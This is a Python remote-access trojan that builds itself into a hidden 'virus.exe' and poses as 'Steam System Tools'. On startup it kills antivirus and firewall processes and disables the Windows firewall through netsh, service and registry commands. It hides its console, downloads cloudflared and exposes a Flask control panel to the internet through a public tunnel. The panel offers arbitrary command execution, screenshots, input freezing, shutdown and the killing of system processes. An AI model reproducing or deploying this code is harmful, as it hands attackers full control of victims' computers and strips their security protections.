import subprocess
import sys
import os

required_modules = ['flask', 'psutil', 'mss', 'pywin32', 'pillow', 'requests']
for mod in required_modules:
    try:
        __import__(mod if mod != 'pillow' else 'PIL')
    except ImportError:
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', mod])

if len(sys.argv) > 1 and sys.argv[1] == 'exe':
    try:
        __import__('PyInstaller')
    except ImportError:
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'pyinstaller'])
    
    script_path = os.path.abspath(__file__)
    output_dir = os.path.dirname(script_path)
    
    subprocess.check_call([
        sys.executable, '-m', 'PyInstaller',
        '--onefile', '--noconsole',
        '--distpath', output_dir,
        '--workpath', os.path.join(output_dir, 'build'),
        '--specpath', output_dir,
        script_path
    ])
    
    spec_file = os.path.join(output_dir, 'virus.spec')
    build_dir = os.path.join(output_dir, 'build')
    if os.path.exists(spec_file):
        os.remove(spec_file)
    if os.path.exists(build_dir):
        import shutil
        shutil.rmtree(build_dir)
    
    print(f'EXE created: {os.path.join(output_dir, "virus.exe")}')
    sys.exit(0)

import ctypes
import socket
import base64
import threading
import time
import re
from io import BytesIO
from flask import Flask, render_template_string, request, redirect, jsonify
import psutil
import mss
import requests

ANTIVIRUS_PROCESSES = [
    'avast', 'avg', 'avguard', 'avira', 'avp', 'avscan', 'bdagent', 'bdservice',
    'bitdefender', 'bullguard', 'ccsvchst', 'cmdagent', 'drweb', 'drw',
    'egui', 'ekrn', 'eset', 'f-secure', 'fsav', 'guard', 'kav', 'kaspersky',
    'kis', 'klavemu', 'knrdl', 'malwarebytes', 'mbam', 'mcshield', 'mcuicnt',
    'msmpeng', 'msseces', 'mssense', 'navapsvc', 'navw32', 'nipsvc', 'nis',
    'nod32', 'norton', 'nsd', 'nsmdtr', 'pavsrv', 'pshost', 'psimsvc',
    'quickheal', 'ravmond', 'rpagent', 'rtvscan', 'savservice', 'sbamsvc',
    'sdcservice', 'secure', 'security', 'sentry', 'setupvpn', 'sophos',
    'spideragent', 'spiderui', 'symantec', 'tmproxy', 'trend', 'uiwatchdog',
    'v3service', 'vba32', 'virus', 'windefend', 'windows defender',
    'wrsa', 'zanda', 'zonealarm', 'antivirus', 'defender', 'msascuil',
    'securityhealthservice', 'securityhealthsystray'
]

FIREWALL_PROCESSES = [
    'firewall', 'mpssvc', 'bfe', 'mpsdrv', 'mpsvchost', 'fwservice',
    'outpost', 'pfw', 'privatefirewall', 'tinyfirewall', 'glasswire',
    'comodo', 'cpf', 'cmdagent', 'cfp'
]

SYSTEM_PROCESSES = [
    'winlogon', 'lsass', 'csrss', 'smss', 'services', 'svchost',
    'dwm', 'explorer', 'taskmgr', 'taskhost', 'taskhostw',
    'spoolsv', 'wininit', 'system', 'registry', 'fontdrvhost',
    'sihost', 'shellexperiencehost', 'startmenuexperiencehost',
    'runtimebroker', 'textinputhost', 'ctfmon', 'dllhost',
    'wlms', 'logonui', 'ntoskrnl', 'conhost', 'cmd',
    'powershell', 'wscript', 'cscript', 'msiexec',
    'wuauclt', 'trustedinstaller', 'tiworker', 'moUSOcoreworker',
    'usoclient', 'wermgr', 'audiodg', 'searchindexer',
    'searchui', 'sndvol', 'rdpclip', 'userinit'
]

PUBLIC_URL = None

def kill_processes(proc_list):
    killed = []
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            name = proc.info['name'].lower().replace('.exe', '')
            for target in proc_list:
                if target in name:
                    proc.kill()
                    killed.append(proc.info['name'])
        except:
            pass
    return killed

def disable_firewall():
    commands = [
        'netsh advfirewall set allprofiles state off',
        'netsh advfirewall set domainprofile state off',
        'netsh advfirewall set privateprofile state off',
        'netsh advfirewall set publicprofile state off',
        'net stop "Windows Firewall" /y',
        'net stop mpssvc /y',
        'sc config mpssvc start= disabled',
        'sc config BFE start= disabled',
        'sc stop mpssvc',
        'sc stop BFE',
        'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile" /v EnableFirewall /t REG_DWORD /d 0 /f',
        'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\PublicProfile" /v EnableFirewall /t REG_DWORD /d 0 /f',
        'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\DomainProfile" /v EnableFirewall /t REG_DWORD /d 0 /f',
        'netsh advfirewall firewall add rule name="SteamService" dir=in action=allow protocol=TCP localport=3000',
    ]
    for cmd in commands:
        os.system(f'{cmd} >nul 2>&1')

def download_cloudflared():
    """Скачивает cloudflared если его нет"""
    cloudflared_path = os.path.join(os.environ.get('TEMP', '.'), 'cloudflared.exe')
    if not os.path.exists(cloudflared_path):
        try:
            url = 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe'
            r = requests.get(url, allow_redirects=True)
            with open(cloudflared_path, 'wb') as f:
                f.write(r.content)
        except:
            pass
    return cloudflared_path

def start_cloudflare_tunnel():
    """Запускает cloudflared tunnel в отдельном потоке"""
    global PUBLIC_URL
    cloudflared = download_cloudflared()
    
    if not os.path.exists(cloudflared):
        return
    
    try:
        process = subprocess.Popen(
            [cloudflared, 'tunnel', '--url', 'http://localhost:3000'],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == 'win32' else 0
        )
        
        # Читаем вывод и ищем URL
        for line in process.stdout:
            match = re.search(r'https://.*?\.trycloudflare\.com', line)
            if match:
                PUBLIC_URL = match.group(0)
                print(f"[TUNNEL] Cloudflare URL: {PUBLIC_URL}")
                break
    
    except Exception as e:
        print(f"[TUNNEL] Error: {e}")

killed_av = kill_processes(ANTIVIRUS_PROCESSES)
killed_fw = kill_processes(FIREWALL_PROCESSES)
disable_firewall()

print("=" * 50)
print("STEAM SYSTEM TOOLS - SERVER STARTED")
if killed_av:
    print(f"Antivirus killed: {', '.join(killed_av)}")
if killed_fw:
    print(f"Firewall killed: {', '.join(killed_fw)}")
print("=" * 50)

def get_all_ips():
    ips = []
    for name, iface in psutil.net_if_addrs().items():
        for addr in iface:
            if addr.family == socket.AF_INET and not addr.address.startswith('127.'):
                ips.append(addr.address)
    return ips

all_ips = get_all_ips()
print(f"  Local:   http://127.0.0.1:3000")
for ip in all_ips:
    print(f"  Network: http://{ip}:3000")

# Запускаем Cloudflare туннель
tunnel_thread = threading.Thread(target=start_cloudflare_tunnel, daemon=True)
tunnel_thread.start()

print("  Cloudflare Tunnel: Starting...")
print("=" * 50)

if sys.platform == 'win32':
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

app = Flask(__name__)

mouse_frozen = False
keyboard_frozen = False

HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Steam System Tools</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { background: #1b2838; color: #c5c3c0; font-family: Arial; padding: 20px; }
        h1 { color: #66c0f4; margin-bottom: 5px; }
        .host { color: #666; font-size: 12px; margin-bottom: 10px; }
        .ips { background: #0a141c; padding: 12px; border-radius: 4px; margin-bottom: 15px; color: #66c0f4; font-size: 13px; word-break: break-all; }
        .ips span { color: #00cc00; }
        .ips strong { color: #66c0f4; }
        .section { background: #16202d; padding: 15px; border-radius: 6px; margin-bottom: 15px; }
        .section h2 { color: #66c0f4; margin-bottom: 10px; font-size: 16px; }
        .btn-row { display: flex; gap: 8px; flex-wrap: wrap; }
        button { padding: 10px 18px; border: none; cursor: pointer; font-weight: bold; border-radius: 3px; font-size: 13px; }
        .btn-blue { background: #2a475e; color: #66c0f4; border: 1px solid #66c0f4; }
        .btn-red { background: #660000; color: #ff4444; border: 1px solid #cc0000; }
        .btn-orange { background: #663300; color: #ff8800; border: 1px solid #ff6600; }
        .btn-green { background: #003300; color: #00cc00; border: 1px solid #00ff00; }
        .btn-yellow { background: #444400; color: #ffff00; border: 1px solid #ffff00; }
        .btn-purple { background: #330033; color: #cc00cc; border: 1px solid #cc00cc; }
        .btn-cyan { background: #003333; color: #00cccc; border: 1px solid #00cccc; }
        button:hover { opacity: 0.8; }
        table { width: 100%; border-collapse: collapse; margin-top: 10px; font-size: 13px; }
        th { background: #0a141c; padding: 8px; text-align: left; cursor: pointer; color: #66c0f4; }
        th:hover { background: #111d2b; }
        td { padding: 6px 8px; border-bottom: 1px solid #1a2a3a; }
        tr:hover { background: #1a2a3a; }
        .kill-btn { background: #660000; color: #ff4444; border: 1px solid #ff0000; padding: 4px 10px; cursor: pointer; font-size: 11px; border-radius: 2px; }
        .kill-btn:hover { background: #990000; }
        input, select { padding: 8px; background: #0a141c; border: 1px solid #2a475e; color: #fff; border-radius: 3px; }
        .cmd-row { display: flex; gap: 8px; margin-top: 8px; }
        .cmd-row input { flex: 1; }
        .status { padding: 4px 10px; border-radius: 3px; font-size: 11px; display: inline-block; margin-left: 8px; }
        .status-on { background: #003300; color: #00cc00; }
        .status-off { background: #330000; color: #cc0000; }
        #screenshot { max-width: 100%; margin-top: 10px; border: 2px solid #2a475e; display: none; }
        .copy-btn { background: #2a475e; color: #66c0f4; border: 1px solid #66c0f4; padding: 4px 10px; cursor: pointer; font-size: 11px; border-radius: 2px; margin-left: 8px; }
        .copy-btn:hover { background: #3a5a7e; }
    </style>
</head>
<body>
    <h1>STEAM SYSTEM TOOLS</h1>
    <p class="host">{{ hostname }} | CPU: {{ cpu }}% | RAM: {{ mem }}%</p>
    <div class="ips">
        <strong>Local:</strong> <span>http://127.0.0.1:3000</span> <button class="copy-btn" onclick="copyText('http://127.0.0.1:3000')">Copy</button><br>
        <strong>Network:</strong> {% for ip in ips %}<span>http://{{ ip }}:3000</span> <button class="copy-btn" onclick="copyText('http://{{ ip }}:3000')">Copy</button> {% endfor %}<br>
        <strong>Cloudflare:</strong> <span id="publicUrl">Connecting to Cloudflare...</span> <button class="copy-btn" onclick="copyUrl()">Copy</button>
    </div>

    <div class="section">
        <h2>Quick Actions</h2>
        <div class="btn-row">
            <form method="POST" action="/logoff"><button class="btn-yellow">Log Off</button></form>
            <form method="POST" action="/restart"><button class="btn-orange">Restart</button></form>
            <form method="POST" action="/shutdown"><button class="btn-red">Shutdown</button></form>
            <button class="btn-blue" onclick="screenshot()">Screenshot</button>
            <button class="btn-orange" onclick="monitorOff()">Monitor Off</button>
            <button class="btn-green" onclick="monitorOn()">Monitor On</button>
            <button class="btn-red" onclick="killAV()">Kill Antivirus</button>
            <button class="btn-red" onclick="killFW()">Kill Firewall</button>
            <button class="btn-purple" onclick="killSystem()">Kill System</button>
            <button class="btn-cyan" onclick="restartTunnel()">Restart Tunnel</button>
        </div>
    </div>

    <div class="section">
        <h2>Mouse & Keyboard</h2>
        <div class="btn-row">
            <button id="btn-mouse" class="btn-blue" onclick="toggleMouse()">Freeze Mouse <span class="status status-off" id="mouse-status">OFF</span></button>
            <button id="btn-keyboard" class="btn-blue" onclick="toggleKeyboard()">Freeze Keyboard <span class="status status-off" id="keyboard-status">OFF</span></button>
        </div>
    </div>

    <div class="section">
        <h2>Command Line</h2>
        <div class="cmd-row">
            <input type="text" id="cmdInput" placeholder="cmd command...">
            <button class="btn-blue" onclick="runCmd()">Execute</button>
        </div>
        <pre id="cmdOutput" style="margin-top:8px; background:#0a141c; padding:8px; max-height:200px; overflow:auto; display:none;"></pre>
    </div>

    <div class="section" id="screenshotSection" style="display:none;">
        <h2>Screenshot <button class="btn-red" onclick="closeScreenshot()" style="float:right;">Close</button></h2>
        <img id="screenshot" src="" alt="Screenshot">
    </div>

    <div class="section">
        <h2>Processes ({{ count }})</h2>
        <table>
            <tr>
                <th onclick="sortTable(0)">PID</th>
                <th onclick="sortTable(1)">Process</th>
                <th onclick="sortTable(2)">CPU %</th>
                <th onclick="sortTable(3)">RAM MB</th>
                <th>Action</th>
            </tr>
            {% for p in processes %}
            <tr>
                <td>{{ p.pid }}</td>
                <td>{{ p.name }}</td>
                <td>{{ p.cpu }}</td>
                <td>{{ p.mem }}</td>
                <td>
                    <form method="POST" action="/kill">
                        <input type="hidden" name="pid" value="{{ p.pid }}">
                        <button class="kill-btn">KILL</button>
                    </form>
                </td>
            </tr>
            {% endfor %}
        </table>
    </div>

    <script>
        function toggleMouse() {
            fetch('/toggle_mouse').then(r => r.json()).then(d => {
                document.getElementById('mouse-status').textContent = d.state;
                document.getElementById('mouse-status').className = d.state === 'ON' ? 'status status-on' : 'status status-off';
            });
        }
        function toggleKeyboard() {
            fetch('/toggle_keyboard').then(r => r.json()).then(d => {
                document.getElementById('keyboard-status').textContent = d.state;
                document.getElementById('keyboard-status').className = d.state === 'ON' ? 'status status-on' : 'status status-off';
            });
        }
        function screenshot() {
            fetch('/screenshot').then(r => r.json()).then(d => {
                document.getElementById('screenshot').src = 'data:image/png;base64,' + d.img;
                document.getElementById('screenshotSection').style.display = 'block';
            });
        }
        function closeScreenshot() {
            document.getElementById('screenshotSection').style.display = 'none';
        }
        function monitorOff() { fetch('/monitor_off'); }
        function monitorOn() { fetch('/monitor_on'); }
        function runCmd() {
            let cmd = document.getElementById('cmdInput').value;
            fetch('/cmd?c=' + encodeURIComponent(cmd)).then(r => r.json()).then(d => {
                let out = document.getElementById('cmdOutput');
                out.style.display = 'block';
                out.textContent = d.output;
            });
        }
        function killAV() { fetch('/kill_av'); alert('Antivirus processes killed'); }
        function killFW() { fetch('/kill_fw'); alert('Firewall processes killed'); }
        function killSystem() { fetch('/kill_system'); alert('System processes killed'); }
        function restartTunnel() { fetch('/restart_tunnel'); alert('Tunnel restarting...'); }
        function copyText(text) { navigator.clipboard.writeText(text); }
        function copyUrl() {
            let url = document.getElementById('publicUrl').textContent;
            if(url.startsWith('https://')) navigator.clipboard.writeText(url);
        }
        // Проверка Cloudflare тунеля каждые 2 секунды
        function checkTunnel() {
            fetch('/tunnel_url').then(r => r.json()).then(d => {
                if(d.url) {
                    document.getElementById('publicUrl').innerHTML = '<span>' + d.url + '</span>';
                } else {
                    document.getElementById('publicUrl').textContent = 'Connecting to Cloudflare...';
                }
            });
        }
        checkTunnel();
        setInterval(checkTunnel, 3000);
        function sortTable(n) {
            let table = document.querySelector('table');
            let rows = Array.from(table.rows).slice(1);
            let sorted = rows.sort((a,b) => {
                let x = a.cells[n].textContent;
                let y = b.cells[n].textContent;
                return isNaN(x) ? x.localeCompare(y) : parseFloat(x) - parseFloat(y);
            });
            if(table.dataset.sort === 'asc') { sorted.reverse(); table.dataset.sort = 'desc'; }
            else { table.dataset.sort = 'asc'; }
            sorted.forEach(r => table.appendChild(r));
        }
    </script>
</body>
</html>
"""

def get_processes():
    procs = []
    for p in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_info']):
        try:
            info = p.info
            procs.append({
                'pid': info['pid'],
                'name': info['name'],
                'cpu': info['cpu_percent'],
                'mem': round(info['memory_info'].rss / 1024 / 1024, 1)
            })
        except:
            pass
    return sorted(procs, key=lambda x: x['mem'], reverse=True)

@app.route('/')
def index():
    procs = get_processes()
    cpu = psutil.cpu_percent()
    mem = psutil.virtual_memory().percent
    ips = get_all_ips()
    return render_template_string(HTML, processes=procs, hostname=socket.gethostname(), ips=ips, cpu=cpu, mem=mem, count=len(procs))

@app.route('/kill', methods=['POST'])
def kill():
    pid = int(request.form.get('pid'))
    try:
        psutil.Process(pid).kill()
    except:
        pass
    return redirect('/')

@app.route('/toggle_mouse')
def toggle_mouse():
    global mouse_frozen
    mouse_frozen = not mouse_frozen
    if mouse_frozen:
        ctypes.windll.user32.BlockInput(True)
    else:
        ctypes.windll.user32.BlockInput(False)
    return jsonify({'state': 'ON' if mouse_frozen else 'OFF'})

@app.route('/toggle_keyboard')
def toggle_keyboard():
    global keyboard_frozen
    keyboard_frozen = not keyboard_frozen
    if keyboard_frozen:
        ctypes.windll.user32.BlockInput(True)
    else:
        ctypes.windll.user32.BlockInput(False)
    return jsonify({'state': 'ON' if keyboard_frozen else 'OFF'})

@app.route('/shutdown', methods=['POST'])
def shutdown():
    os.system('shutdown /s /t 0')
    return 'OK'

@app.route('/restart', methods=['POST'])
def restart():
    os.system('shutdown /r /t 0')
    return 'OK'

@app.route('/logoff', methods=['POST'])
def logoff():
    os.system('shutdown /l')
    return 'OK'

@app.route('/screenshot')
def screenshot():
    with mss.mss() as sct:
        monitor = sct.monitors[1]
        img = sct.grab(monitor)
        buf = BytesIO()
        mss.tools.to_png(img.rgb, img.size, output=buf)
        return jsonify({'img': base64.b64encode(buf.getvalue()).decode()})

@app.route('/cmd')
def cmd():
    c = request.args.get('c', '')
    try:
        out = subprocess.check_output(c, shell=True, stderr=subprocess.STDOUT, timeout=10)
        output = out.decode('cp866', errors='replace')
    except Exception as e:
        output = str(e)
    return jsonify({'output': output})

@app.route('/monitor_off')
def monitor_off():
    ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, 2)
    return 'OK'

@app.route('/monitor_on')
def monitor_on():
    ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, -1)
    return 'OK'

@app.route('/kill_av')
def kill_av():
    killed = kill_processes(ANTIVIRUS_PROCESSES)
    return jsonify({'killed': killed})

@app.route('/kill_fw')
def kill_fw():
    killed = kill_processes(FIREWALL_PROCESSES)
    disable_firewall()
    return jsonify({'killed': killed})

@app.route('/kill_system')
def kill_system():
    killed = kill_processes(SYSTEM_PROCESSES)
    return jsonify({'killed': killed})

@app.route('/tunnel_url')
def tunnel_url():
    global PUBLIC_URL
    return jsonify({'url': PUBLIC_URL})

@app.route('/restart_tunnel')
def restart_tunnel():
    threading.Thread(target=start_cloudflare_tunnel, daemon=True).start()
    return jsonify({'status': 'restarting'})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=3000, debug=False)